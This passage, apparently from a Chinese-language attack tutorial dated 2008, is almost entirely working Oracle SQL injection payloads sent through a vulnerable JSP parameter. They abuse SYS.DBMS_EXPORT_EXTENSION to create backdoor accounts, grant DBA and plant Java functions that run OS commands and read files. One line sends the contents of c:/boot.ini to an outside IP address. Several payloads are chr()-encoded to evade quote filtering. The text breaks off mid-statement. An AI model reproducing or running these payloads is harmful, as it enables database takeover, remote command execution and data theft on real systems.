+　　SELECT UTL_HTTP.request('http://211.71.147.3/record.php?a=LinxRunCMD:'||REPLACE(REPLACE(sys.LinxReadFile('c:/boot.ini'),' ','%20'),'\n','%0A')) FROM dual
+　　)
+　　注意：用UTL_HTTP.request时，要用 REPLACE() 把空格、换行符给替换掉，否则会无法提交http request。用utl_encode.base64_encode也可以。
+　　--------------------
+　　6.内部变化
+　　通过以下命令可以查看all_objects表达改变：
+　　select  * from all_objects where  object_name like '%LINX%' or  object_name like '%Linx%'
+　　7.删除我们创建的函数
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　drop function LinxRunCMD  '''';END;'';END;--','SYS',0,'1',0) from dual
+　　====================================================
+　　全文结束。谨以此文赠与我的朋友。
+　　linx
+　　124829445
+　　2008.1.12
+　　linyujian@bjfu.edu.cn
+　　======================================================================
+　　测试漏洞的另一方法：
+　　创建oracle帐号：
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　CREATE USER linxsql IDENTIFIED BY linxsql'''';END;'';END;--','SYS',0,'1',0) from dual
+　　即：
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+　　chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(67)||chr(82)||chr(69)||chr(65)||chr(84)||chr(69)||chr(32)||chr(85)||chr(83)||chr(69)||chr(82)||chr(32)||chr(108)||chr(105)||chr(110)||chr(120)||chr(115)||chr(113)||chr(108)||chr(32)||chr(73)||chr(68)||chr(69)||chr(78)||chr(84)||chr(73)||chr(70)||chr(73)||chr(69)||chr(68)||chr(32)||chr(66)||chr(89)||chr(32)||chr(108)||chr(105)||chr(110)||chr(120)||chr(115)||chr(113)||chr(108)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+　　确定漏洞存在：
+　　1<>(
+　　select user_id from all_users where username='LINXSQL'
+　　)
+　　给linxsql连接权限：
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　GRANT CONNECT TO linxsql'''';END;'';END;--','SYS',0,'1',0) from dual
+　　删除帐号：
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　drop user LINXSQL'''';END;'';END;--','SYS',0,'1',0) from dual
+　　======================
+　　以下方法创建一个可以执行多语句的函数Linx_query()，执行成功的话返回数值"1"，但权限是继承的，可能仅仅是public权限，作用似乎不大，真的要用到话可以考虑grant dba to 当前的User：
+　　1.jsp?id=1 and '1'<>(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace function Linx_query (p varchar2) return number authid current_user is begin execute immediate p; return 1;  end;   '''';END;'';END;--','SYS',0,'1',0) from dual
+　　) and ...
+　　1.jsp?id=1 and '1'<>(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE
+
+''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on Linx_query to public'''';END;'';END;--','SYS',0,'1',0) from dual
+　　) and ...
+　　1.jsp?id=1 and '1'<>(
+　　SELECT sys.Linx_Query('SELECT 14554 FROM DUAL') FROM DUAL
+　　) and ...
+　　1.jsp?id=1 and '1'<>(
+　　SELECT sys.Linx_Query('declare pragma
+　　autonomous_transaction; begin execute immediate ''
+　　select 1 from dual
+　　''; commit; end;') from dual
+　　) and ...
+　　多语句：
+　　SELECT sys.Linx_Query('declare temp varchar2(200); begin select 1 into temp from dual; select 2 into temp from dual; end;') from dual
+　　创建用户(除非当前用户有system权限，否则无法成功)：
+　　SELECT sys.Linx_Query('declare pragma
+　　autonomous_transaction; begin execute immediate ''
+　　CREATE USER Linx_Query_User IDENTIFIED BY Linx_Query_User
+　　''; commit; end;') from dual
+　　================
+　　以下的方法是先建立函数Linx_Query(),再建立 RunCMD2()
+　　1.创建函数
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace function Linx_Query (p
+　　varchar2) return number authid current_user is begin execute immediate
+　　p; return 1;  end;   '''';END;'';END;--','SYS',0,'1',0) from dual;
+　　如果有权限，以下语句应该允许正常
+　　select sys.linx_query('select 1 from dual') from dual;
+　　不然的话运行：
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　grant dba to 当前的User'''';END;'';END;--','SYS',0,'1',0) from dual
+　　2.创建包
+　　SELECT sys.Linx_Query('declare pragma
+　　autonomous_transaction; begin execute immediate ''
+　　create or replace and compile java source named "LinxUtil2"   as import java.io.*;public class LinxUtil2 extends Object {public static String RunCMD(String args) throws IOException{BufferedReader myReader= new BufferedReader(
+　　new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) );  String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";return str;}}''; commit; end;') from dual
+　　3.创建函数
+　　SELECT sys.Linx_Query('declare pragma
+　　autonomous_transaction; begin execute immediate ''
+　　create or replace function RunCMD2(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil2.RunCMD(java.lang.String) return String'''';''; commit; end;') from dual
+　　4.给权限
+　　给用户SYSTEM执行权限：
+　　SELECT sys.Linx_Query('declare pragma autonomous_transaction;begin dbms_java.grant_permission( ''SYSTEM'', ''SYS:java.io.FilePermission'', ''<<ALL FILES>>'', ''execute'' );end;') from dual
+　　5.执行函数
+　　select RunCMD2('cmd /c dir') from dual
+　　==================
+　　================================
+　　以下是无 " ' " 版：
+　　以下是各个步骤：
+　　1.创建包
+　　通过注入 SYS.DBMS_EXPORT_EXTENSION 函数，在oracle上创建Java包LinxUtil，里面两个函数，runCMD用于执行系统命令，readFile用于读取文件：
+　　因为建立了两个函数，转换为ascii后，语句更长了，注意提交时不要把换行去掉，否则执行不成功的：
+　　/xxx.jsp?id=1 and chr(49)<>chr(50)||(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+　　chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+　　chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+　　chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+　　chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||
+　　chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(99)||chr(111)||chr(109)||chr(112)||chr(105)||chr(108)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(115)||chr(111)||chr(117)||chr(114)||chr(99)||chr(101)||chr(32)||chr(110)||
+　　chr(97)||chr(109)||chr(101)||chr(100)||chr(32)||chr(34)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(34)||chr(32)||chr(97)||chr(115)||chr(32)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||
+　　chr(46)||chr(105)||chr(111)||chr(46)||chr(42)||chr(59)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(99)||chr(108)||chr(97)||chr(115)||chr(115)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(32)||chr(101)||
+　　chr(120)||chr(116)||chr(101)||chr(110)||chr(100)||chr(115)||chr(32)||chr(79)||chr(98)||chr(106)||chr(101)||chr(99)||chr(116)||chr(32)||chr(123)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||
+　　chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(32)||chr(123)||chr(116)||chr(114)||chr(121)||
+　　chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||
+　　chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||
+　　chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(32)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(46)||chr(103)||chr(101)||chr(116)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(40)||chr(41)||chr(46)||chr(101)||
+　　chr(120)||chr(101)||chr(99)||chr(40)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(46)||chr(103)||chr(101)||chr(116)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(40)||chr(41)||chr(32)||chr(41)||chr(32)||chr(41)||
+　　chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||
+　　chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||
+　　chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||
+　　chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||
+　　chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||
+　　chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(101)||
+　　chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||
+　　chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||
+　　chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(70)||chr(105)||chr(108)||chr(101)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||
+　　chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(41)||chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||
+　　chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||
+　　chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||
+　　chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||
+　　chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||
+　　chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(125)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45)
+　　,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+　　)
+　　------------------------------
+　　2.赋Java权限
+　　/xxx.jsp?id=1 and chr(49)<>chr(50)||(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+　　chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+　　chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+　　chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+　　chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(98)||chr(101)||chr(103)||chr(105)||chr(110)||chr(32)||chr(100)||chr(98)||chr(109)||chr(115)||chr(95)||chr(106)||chr(97)||chr(118)||chr(97)||
+　　chr(46)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(95)||chr(112)||chr(101)||chr(114)||chr(109)||chr(105)||chr(115)||chr(115)||chr(105)||chr(111)||chr(110)||chr(40)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(80)||chr(85)||chr(66)||chr(76)||chr(73)||chr(67)||chr(39)||
+　　chr(39)||chr(39)||chr(39)||chr(44)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(83)||chr(89)||chr(83)||chr(58)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(105)||chr(111)||chr(46)||chr(70)||chr(105)||chr(108)||chr(101)||chr(80)||chr(101)||chr(114)||chr(109)||chr(105)||
+　　chr(115)||chr(115)||chr(105)||chr(111)||chr(110)||chr(39)||chr(39)||chr(39)||chr(39)||chr(44)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(60)||chr(60)||chr(65)||chr(76)||chr(76)||chr(32)||chr(70)||chr(73)||chr(76)||chr(69)||chr(83)||chr(62)||chr(62)||chr(39)||chr(39)||
+　　chr(39)||chr(39)||chr(44)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(101)||chr(120)||chr(101)||chr(99)||chr(117)||chr(116)||chr(101)||chr(39)||chr(39)||chr(39)||chr(39)||chr(41)||chr(59)||chr(101)||chr(110)||chr(100)||chr(59)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||
+　　chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45)
+　　,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+　　)
+　　readfile函数的ascii版就不写了，见谅。
+　　3.创建函数
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+　　chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+　　chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+　　chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+　　chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||
+　　chr(99)||chr(101)||chr(32)||chr(102)||chr(117)||chr(110)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(112)||chr(95)||chr(99)||chr(109)||chr(100)||chr(32)||chr(105)||
+　　chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(41)||chr(32)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(32)||chr(32)||
+　　chr(97)||chr(115)||chr(32)||chr(108)||chr(97)||chr(110)||chr(103)||chr(117)||chr(97)||chr(103)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(76)||chr(105)||chr(110)||chr(120)||
+　　chr(85)||chr(116)||chr(105)||chr(108)||chr(46)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(108)||chr(97)||chr(110)||chr(103)||chr(46)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(41)||chr(32)||
+　　chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(39)||chr(39)||chr(39)||chr(39)||chr(59)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||
+　　chr(59)||chr(45)||chr(45)
+　　,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+　　4.赋public执行函数的权限
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+　　chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+　　chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+　　chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+　　chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(32)||chr(97)||chr(108)||chr(108)||chr(32)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||
+　　chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(32)||chr(116)||chr(111)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||
+　　chr(59)||chr(45)||chr(45)
+　　,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+　　5.执行命令：
+　　/xxx.jsp?id=1 and chr(49)<>chr(32)||(
+　　select  sys.LinxRunCMD('cmd /c net user linx /add') from dual
+　　)
+　　即
+　　/xxx.jsp?id=1 and chr(49)<>chr(32)||(
+　　select  sys.LinxRunCMD(chr(99)||chr(109)||chr(100)||chr(32)||chr(47)||chr(99)||chr(32)||chr(110)||chr(101)||chr(116)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(32)||chr(108)||chr(105)||chr(110)||chr(120)||chr(32)||chr(47)||chr(97)||chr(100)||chr(100)) from dual
+　　)
+　　/////////////////////
+　　再加一个函数openDir():
+　　在oracle上创建Java包LinxUtil，里面三个函数，runCMD用于执行系统命令，readFile用于读取文件，openDir用于浏览目录：
+　　/xxx.jsp?id=1 and '1'<>'a'||(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or&nbsp;replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {
